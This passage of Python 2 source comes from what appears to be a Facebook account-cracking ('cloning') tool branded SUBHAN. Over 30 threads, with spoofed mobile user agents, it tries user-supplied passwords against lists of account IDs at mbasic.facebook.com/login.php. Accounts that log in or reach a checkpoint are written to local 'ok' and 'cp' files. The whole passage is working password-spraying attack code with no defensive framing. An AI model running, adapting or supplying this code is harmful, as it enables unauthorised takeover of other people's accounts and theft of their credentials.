                        ok.write(uid+ " | " +pass2+ "\n")
                        ok.close()
                        oks.append(uid+pass2)
                    else:
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass2
                            cp=open('SUBHAN-OK.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            cps.append(uid+pass2)
                        else:
                            pass3 = first+ps2
                            rana = requests.Session()
                            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                            p = rana.get('https://mbasic.facebook.com')
                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass3, 'login': 'submit'})
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass3
                                ok=open('SUBHAN-ok.txt', 'a')
                                ok.write(uid+ " | " +pass3+ "\n")
                                ok.close()
                                oks.append(uid+pass3)
                            else:
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print "\x1b[1;91m[SUBHAN-CP] "+uid + " | " + pass3
                                    cp=open('SUBHAN-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    cps.append(uid+pass3)
                                else:
                                    pass4 = first+ps3
                                    rana = requests.Session()
                                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                                    p = rana.get('https://mbasic.facebook.com')
                                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass4, 'login': 'submit'})
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass4
                                        ok=open('[SUBHAN-ok.txt', 'a')
                                        ok.write(uid+ " | " +pass4+ "\n")
                                        ok.close()
                                        oks.append(uid+pass4)
                                    else:
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            print "\x1b[1;91m[SUBHAN-CP] "+uid + " | " + pass4
                                            cp=open('SUBHAN-cp.txt', 'a')
                                            cp.write(uid+ " | " +pass4+ "\n")
                                            cp.close()
                                            cps.append(uid+pass4)
                                        else:
                                            pass5 = first+ps4
                                            rana = requests.Session()
                                            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                                            p = rana.get('https://mbasic.facebook.com')
                                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass5, 'login': 'submit'})
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass5
                                                ok=open('subhan-ok.txt', 'a')
                                                ok.write(uid+ " | " +pass5+ "\n")
                                                ok.close()
                                                oks.append(uid+pass5)
                                            else:
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print "\x1b[1;92m[SUBHAN-CP] "+uid + " | " + pass5
                                                    cp=open('SUBHAN-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
                                                    cps.append(uid+pass5)
                            
                    
        except:
            pass
    
    p = ThreadPool(30)
    p.map(main, idx)
    print "\x1b[1;97m"
    print 39*'-'
    print "[!] Cloning Complete Result ........"
    print 39*'-'
    print '[!] Total Ok Ids : '+str(len(oks))
    print '[!] Total Cp Ids: '+str(len(cps))
    print 39*'-'
    print ''
    raw_input(' Press Enter To Back ')
    main_system()

def f_p_pass():
    os.system('clear')
    print logo
    print ""
    ps1=raw_input('[1] Password : ')
    ps2=raw_input('[2] Password : ')
    ps3=raw_input('[3] Password : ')
    ps4=raw_input('[4] Password : ')
    ps5=raw_input('[5] Password : ')
    ps6=raw_input('[6] Password : ')
    print ""
    try:
        mf=raw_input('[!] Enter path :')
        print ''
        for line in open(mf,'r').readlines():
            idx.append(line.strip())
    except:
        print ('file not found')
        time.sleep(2)
        n_f_p_pass()
        
        
    print "[!] total ids : "+str(len(idx))
    os.system('echo " ༄Mr𝙧᭄•─────────────────•༄SUBHAN𝙧᭄"| lolcat')
    print "\033[1;91m    Cracking Start Please Wait .."
    print "\033[1;91m    Use Flight Mod For Speed Up"
    os.system('echo "༄Mr𝙧᭄•─────────────────•༄SUBHAN𝙧᭄"| lolcat')
    
    def main(arg):
        user=arg
        uid, name = user.split("|")
        lines = random.choice([
			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]", 
			'Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]',
'Mozilla/5.0 (Linux; Android 11; Nokia 3.2 Build/RKQ1.200928.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
			"Mozilla/5.0 (Linux; Android 11; SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36", 
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
		])
        try:
            pass1 = ps1
            rana = requests.Session()
            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = rana.get('https://mbasic.facebook.com')
            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass1, 'login': 'submit'})
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass1
                ok=open('SUBHAN-ok.txt', 'a')
                ok.write(uid+ " | " +pass1+ "\n")
                ok.close()
                oks.append(uid+pass1)
            else:
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass1
                    cp=open('SUBHAN-cp.txt', 'a')
                    cp.write(uid+ " | " +pass1+ "\n")
                    cp.close()
                    cps.append(uid+pass1)
                else:
                    pass2= ps1
                    rana = requests.Session()
                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                    p = rana.get('https://mbasic.facebook.com')
                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass2, 'login': 'submit'})
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass2
                        ok=open('SUBHAN-ok.txt', 'a')
                        ok.write(uid+ " | " +pass2+ "\n")
                        ok.close()
                        oks.append(uid+pass2)
                    else:
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            print "\x1b[1;91m[SUBHAN-CP] "+uid + " | " + pass2
                            cp=open('SUBHAN-cp.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            cps.append(uid+pass2)
                        else:
                            pass3=ps3
                            rana = requests.Session()
                            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                            p = rana.get('https://mbasic.facebook.com')
                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass3, 'login': 'submit'})
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass3
                                ok=open('SUBHAN-ok.txt', 'a')
                                ok.write(uid+ " | " +pass3+ "\n")
                                ok.close()
                                oks.append(uid+pass3)
                            else:
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print "\x1b[1;91m[SUBHAN-CP] "+uid + " | " + pass3
                                    cp=open('SUBHAN-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    cps.append(uid+pass3)
                                else:
                                    pass4=ps4
                                    rana = requests.Session()
                                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                                    p = rana.get('https://mbasic.facebook.com')
                                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass4, 'login': 'submit'})
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass4
                                        ok=open('SUBHAN-ok.txt', 'a')
                                        ok.write(uid+ " | " +pass4+ "\n")
                                        ok.close()
                                        oks.append(uid+pass4)
                                    else:
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            print "\x1b[1;91m[SUBHAN-CP] "+uid + " | " + pass4
                                            cp=open('SUBHAN-cp.txt', 'a')
                                            cp.write(uid+ " | " +pass4+ "\n")
                                            cp.close()
                                            cps.append(uid+pass4)
                                        else:
                                            pass5=ps5
                                            rana = requests.Session()
                                            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                                            p = rana.get('https://mbasic.facebook.com')
                                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass5, 'login': 'submit'})
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass5
                                                ok=open('SUBHAN-ok.txt', 'a')
                                                ok.write(uid+ " | " +pass5+ "\n")
                                                ok.close()
                                                oks.append(uid+pass5)
                                            else:
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print "\x1b[1;91m[SUBHAN-CP] "+uid + " | " + pass5
                                                    cp=open('SUBHAN-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
                                                    cps.append(uid+pass5)
                                                else:
                                                    pass6=ps6
                                                    rana = requests.Session()
                                                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                                                    p = rana.get('https://mbasic.facebook.com')
                                                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass6, 'login': 'submit'})
                                                    if 'c_user' in rana.cookies.get_dict().keys():
                                                        print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass6
                                                        ok=open('SUBHAN-ok.txt', 'a')
                                                        ok.write(uid+ " | " +pass6+ "\n")
                                                        ok.close()
                                                        oks.append(uid+pass6)
                                                    else:
                                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                                            print "\x1b[1;91m[SUBHAN-CP] "+uid + " | " + pass6
                                                            cp=open('SUBHAN-cp.txt', 'a')
                                                            cp.write(uid+ " | " +pass6+ "\n")
                                                            cp.close()
                                                            cps.append(uid+pass6)
                            
                    
        except:
            pass
    
    p = ThreadPool(30)
    p.map(main, idx)
    print "\x1b[1;97m"
    print 39*'-'
    print "[!] Cloning Complete Result ........"
    print 39*'-'
    print '[!] Total OK IDS : '+str(len(oks))
    print '[!] Total CP IDS:'+str(len(cps))
    print 39*'-'
    print ''
    raw_input(' Press Enter To Back ')
    fb_menu()

if __name__=='__main__':
    main_apv()